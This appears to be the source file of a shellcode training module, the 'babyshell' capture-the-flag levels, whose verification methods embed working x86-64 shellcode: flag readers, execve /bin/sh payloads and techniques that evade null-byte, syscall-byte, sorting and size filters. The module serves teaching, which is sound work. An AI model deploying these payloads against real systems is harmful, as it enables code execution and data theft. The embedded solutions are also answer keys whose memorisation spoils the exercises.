import pwnshop
import pwn
import os

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge


class BabyShellBase(Challenge):
    TEMPLATE_PATH = "babyshell/babyshell.c"
    EXEC_STACK = True
    CANARY = True
    LINK_LIBRARIES = ["capstone"]

    stack_shellcode = False
    shellcode_size = 0x1000
    allocation_size = 0x1000
    remap_rx_size = 0x0
    shellcode_filter = None
    close_stdin = False
    close_stdout = False
    close_stderr = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.shellcode_address = self.random.randrange(0x13370000, 0x31337000, 0x1000)

class BabyShellBasicShellcode(BabyShellBase):
    """
    Write and execute shellcode to read the flag!
    """

    stack_shellcode = True
    shellcode_size = 0x1000
    allocation_size = 0x1000

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto the stack (address varies every time that it is run)
        """
        with self.run_challenge(**kwargs) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.open("/flag") + pwn.shellcraft.sendfile(1, 3, 0, 1024)
            )
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyShellNopSled(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but a portion of your input is randomly skipped.
    """

    stack_shellcode = True
    shellcode_size = 0x1000
    allocation_size = 0x1000

    shellcode_filter = "babyshell/filter_random_skip.c"

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto the stack (address varies every time that it is run), randomly skip up to 0x800 bytes in shellcode (nop sled)
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            nop_shellcode = pwn.asm("nop\n" * 0x800)
            shellcode = pwn.asm(pwn.shellcraft.readfile("/flag", 1))
            process.write(nop_shellcode + shellcode)
            assert self.flag in process.readall()


def readfile_fails(self, process, assert_filter=False):
    shellcode = pwn.asm(pwn.shellcraft.readfile("/flag", 1))
    process.write(shellcode)
    result = process.readall()
    assert self.flag not in result
    if assert_filter:
        assert b"Failed filter" in result


shellcode_filter_H_code = """
push 0x2f
push rsp
pop rdi
push 80
pop rax
syscall
push 0x67616c66
push rsp
pop rdi
xor edx, edx
xor esi, esi
push 2
pop rax
syscall

push 1
pop rdi
push 3
pop rsi
push 0
pop rdx
push 0x1000
pop r10
push 0x28
pop rax
syscall
"""

shellcode_filter_H = pwn.asm(shellcode_filter_H_code)


class BabyShellNoNullBytesFilter(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
    """

    shellcode_filter = "babyshell/filter_null.c"

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto fixed memory location, no null bytes
        """
        with self.run_challenge(**kwargs) as process:
            shellcode = pwn.asm(pwn.shellcraft.readfile("/flag", 1))
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyShellNoHBytesFilter(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
    """
    shellcode_filter = "babyshell/filter_H.c"

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto fixed memory location, no 'H' bytes
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process, assert_filter=True)

        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_filter_H)
            assert self.flag in process.readall()


shellcode_filter_syscall = pwn.asm(
    """
    xor eax, eax
    mov al, 0x0f
    lea rbx, _sc1[rip]
    mov BYTE PTR [rbx], al
    lea rbx, _sc2[rip]
    mov BYTE PTR [rbx], al
    lea rdi, _string[rip]
    xor rsi, rsi
    xor rax, rax
    mov al, 2
_sc1:
    .ascii "\x42\x05"
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
_sc2:
    .ascii "\x42\x05"
_string:
    .ascii "/flag"
"""
)


class BabyShellNoSyscallFilter(BabyShellBase): #no_syscalls
    """
    Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?
    """

    shellcode_filter = "babyshell/filter_syscall.c"

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto fixed memory location, no syscall, sysenter, or int (0x0f05, 0x0f34, 0x80cd)
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process, assert_filter=True)

        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_filter_syscall)
            assert self.flag in process.readall()


class BabyShellNoSyscallFilterWithNopSled(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!
    """

    shellcode_size = 0x2000
    allocation_size = 0x2000
    remap_rx_size = 0x1000
    shellcode_filter = "babyshell/filter_syscall.c"

    def verify(self, **kwargs):
        """
        Read 0x2000 bytes onto fixed memory location, no write perms to first 4096 bytes, and no syscall, sysenter, or int (0x0f05, 0x0f34, 0x80cd)
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process, assert_filter=True)

        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_filter_syscall)
            assert self.flag not in process.readall()

        with self.run_challenge(**kwargs) as process:
            nop_shellcode = pwn.asm("nop\n" * 0x1000)
            process.write(nop_shellcode + shellcode_filter_syscall)
            assert self.flag in process.readall()


shellcode_filter_sort = pwn.asm(
    """
xor eax,eax
xor rdi,rdi
lea rsi,[rip]
syscall
.byte 0xff, 0xff
"""
)


class BabyShellBlindShellcoding(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.
    """

    EXEC_STACK = False

    shellcode_size = 0x4000
    allocation_size = 0x4000
    close_stdin = True
    close_stdout = True
    close_stderr = True

    def verify(self, **kwargs):
        """
        Read 0x4000 bytes onto fixed memory location, closed stdin, closed stderr, closed stdout (blind shellcoding)
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            self.run_sh(f"mkfifo {self.work_dir}/fifo")
            shellcode = pwn.asm(
                pwn.shellcraft.open("/flag")
                + pwn.shellcraft.open(f"{self.work_dir}/fifo", 1)
                + pwn.shellcraft.sendfile(1, 0, 0, 1024)
            )
            process.write(shellcode)
            assert self.flag in self.run_sh(f"cat {self.work_dir}/fifo").readall()


class BabyShellMax18BytesNoWritePerms(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but you only get 18 bytes.
    """

    EXEC_STACK = False

    shellcode_size = 18
    allocation_size = 0x1000
    remap_rx_size = 0x1000

    def verify(self, **kwargs):
        """
        Read 0x12 bytes onto fixed memory location, no write perms to first 4096 bytes
        """
        with open(";", "w") as f:
            f.write("#!/bin/sh\ncat /flag")
        os.chmod(";", 0o755)

        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_short)
            assert self.flag in process.readall()


class BabyShellInsertedSigtrapsFilter(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but your input has data inserted into it before being executed.
    """

    remap_rx_size = 0x1000
    shellcode_filter = "babyshell/filter_replace_with_cc.c"

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto fixed memory location, no write perms to first 4096 bytes, replace every other 10 bytes replaced with 0xcc
        """
        with open(";", "w") as f:
            f.write("#!/bin/sh\ncat /flag")
        os.chmod(";", 0o755)

        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            original_shellcode = shellcode_short_code
            jmp_10_bytes = b"\xeb\x0a"  # jump forward 10 bytes

            shellcode = b""

            for line in original_shellcode.splitlines():
                line_asm = pwn.asm(line)
                if line_asm:
                    nops_needed = 10 - len(jmp_10_bytes) - len(line_asm)
                    assert nops_needed >= 0
                    if nops_needed:
                        nops = pwn.asm("nop\n" * nops_needed)
                    else:
                        nops = b""
                    new_line = line_asm + nops + jmp_10_bytes
                    assert len(new_line) == 10
                    shellcode += new_line + b"\xcc" * 10

            process.write(shellcode)
            assert self.flag in process.readall()


class BabyShellBubbleSortFilter(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but your input is sorted before being executed!
    """

    shellcode_filter = "babyshell/filter_sort.c"
    sort_type = "uint64_t"

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto fixed memory location, shellcode is sorted using bubblesort, using 8 bytes (uint64_t)
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            nop_shellcode = pwn.asm("nop\n" * 0x4)
            shellcode = pwn.asm(pwn.shellcraft.readfile("/flag", 1))
            process.write(shellcode_filter_sort)
            process.readuntil("Executing shellcode!")
            process.write(nop_shellcode + shellcode)
            assert self.flag in process.readall()


shellcode_filter_sort_no_stdin = pwn.asm(
    """
xor eax, eax;           nop; nop; nop; nop;             mov cl, 0;
mov al, 'g';            nop; nop; nop; nop;             mov cl, 1;
shl rax, 8;             nop; nop;                       mov cl, 2;
mov al, 'a';            nop; nop; nop; nop;             mov cl, 3;
shl rax, 8;             nop; nop;                       mov cl, 4;
mov al, 'l';            nop; nop; nop; nop;             mov cl, 5;
shl rax, 8;             nop; nop;                       mov cl, 6;
mov al, 'f';            nop; nop; nop; nop;             mov cl, 7;
shl rax, 8;             nop; nop;                       mov cl, 8;
mov al, '/';            nop; nop; nop; nop;             mov cl, 9;
push rax;               nop; nop; nop; nop; nop;        mov cl, 10;
xor eax, eax;           nop; nop; nop; nop;             mov cl, 11;
mov al, 2;              nop; nop; nop; nop;             mov cl, 12;
mov rdi, rsp;           nop; nop; nop;                  mov cl, 13;
xor esi, esi;           nop; nop; nop; nop;             mov cl, 14;
syscall;                nop; nop; nop; nop;             mov cl, 15;
xor edi, edi;           nop; nop; nop; nop;             mov cl, 16;
inc edi;                nop; nop; nop; nop;             mov cl, 17;
mov esi, eax;           nop; nop; nop; nop;             mov cl, 18;
xor edx, edx;           nop; nop; nop; nop;             mov cl, 19;
mov r10b, 0xff;         nop; nop; nop;                  mov cl, 20;
mov al, 40;             nop; nop; nop; nop;             mov cl, 21;
syscall;                nop; nop; nop; nop;             mov cl, 22;
"""
)


class BabyShellBubbleSortFilterNoStdin(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but your input is sorted before being executed and stdin is closed.
    """

    shellcode_filter = "babyshell/filter_sort.c"
    sort_type = "uint64_t"
    close_stdin = True

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto fixed memory location, shellcode is sorted using bubblesort, using 8 bytes (uint64_t), stdin closed
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_filter_sort_no_stdin)
            assert self.flag in process.readall()


shellcode_filter_unique = pwn.asm(
    """
mov r12,0x68732f6e69622e
push r12
inc BYTE PTR [rsp]
mov rdi, rsp
xor esi,esi
sub edx,edx
mov al,59
syscall
"""
)


class BabyShellUniqueByteFilter(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but every byte in your input must be unique.
    """

    shellcode_filter = "babyshell/filter_unique.c"

    def verify(self, **kwargs):
        """
        Read 0x1000 bytes onto fixed memory location, each shellcode byte must be unique
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process, assert_filter=True)

        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_filter_unique)
            process.readuntil("Executing shellcode!")
            process.sendline("cat /flag; exit")
            assert self.flag in process.readall()


shellcode_short_code = """
xor esi, esi
xor edx, edx
mov al, 0x3b
push rax
push rsp
pop rdi
syscall
"""

shellcode_short = pwn.asm(shellcode_short_code)


class BabyShellMax12BytesNoWritePerms(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but this time you only get 12 bytes!
    """

    EXEC_STACK = False

    shellcode_size = 12
    allocation_size = 0x1000
    remap_rx_size = 0x1000

    def verify(self, **kwargs):
        """
        Read 0xC bytes onto fixed memory location, no write perms to first 4096 bytes
        """
        with open(";", "w") as f:
            f.write("#!/bin/sh\ncat /flag")
        os.chmod(";", 0o755)

        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_short)
            assert self.flag in process.readall()


shellcode_tiny = pwn.asm(
    """
xor edi, edi
mov esi, edx
syscall
"""
)


class BabyShellMax6Bytes(BabyShellBase):
    """
    Write and execute shellcode to read the flag, but this time you only get 6 bytes :)
    """

    EXEC_STACK = False

    shellcode_size = 6
    allocation_size = 0x1000

    def verify(self, **kwargs):
        """
        Read 0x6 bytes onto fixed memory location
        """
        with self.run_challenge(**kwargs) as process:
            readfile_fails(self, process)

        with self.run_challenge(**kwargs) as process:
            nop_shellcode = pwn.asm("nop\n" * 0x6)
            shellcode = pwn.asm(pwn.shellcraft.readfile("/flag", 1))
            process.write(shellcode_tiny)
            process.readuntil("Executing shellcode!")
            process.write(nop_shellcode + shellcode)
            assert self.flag in process.readall()

LEVELS = [
    BabyShellBasicShellcode,
    BabyShellNopSled,
    BabyShellNoNullBytesFilter,
    BabyShellNoHBytesFilter,
    BabyShellNoSyscallFilter,
    BabyShellNoSyscallFilterWithNopSled,
    BabyShellBlindShellcoding,
    BabyShellMax18BytesNoWritePerms,
    BabyShellInsertedSigtrapsFilter,
    BabyShellBubbleSortFilter,
    BabyShellBubbleSortFilterNoStdin,
    BabyShellUniqueByteFilter,
    BabyShellMax12BytesNoWritePerms,
    BabyShellMax6Bytes,
]
NUM_TESTING=0
DOJO_MODULE="shellcode"
pwnshop.register_challenges(LEVELS)
